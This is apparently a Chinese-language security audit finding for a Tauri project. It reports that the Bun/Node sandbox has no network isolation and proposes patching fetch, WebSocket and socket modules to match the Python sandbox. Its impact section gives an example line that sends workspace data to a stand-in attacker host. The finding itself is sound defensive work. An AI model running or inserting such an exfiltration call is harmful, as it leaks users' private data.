# F010 · Bun/Node 沙箱无网络隔离

- 来源：[20261002 全项目走查](./20261002-走查报告原文.md) §1.10
- 位置：`src-tauri/src/bun_manager.rs:129-133（注释自认）、:254-258`
- 级别：P1 严重·安全
- 状态：**待修复**

## 问题与影响

Bun 原生 fetch/TCP 不读 HTTP_PROXY，注释明写「网络隔离不承诺」——await fetch('https://attacker.example/exfil?d=...') 即可外传工作区数据。Python 侧有 socket monkey-patch，Node 侧完全缺口；sandbox_audit 仅 observe-only。

## 修复方案

SANDBOX_GUARD_JS 中 patch globalThis.fetch / WebSocket / node:net / node:dgram / node:tls，与 Python 侧对齐。

## 验证

沙箱内 Bun fetch 外联被拦截报错；白名单/离线语义与 Python 沙箱一致。
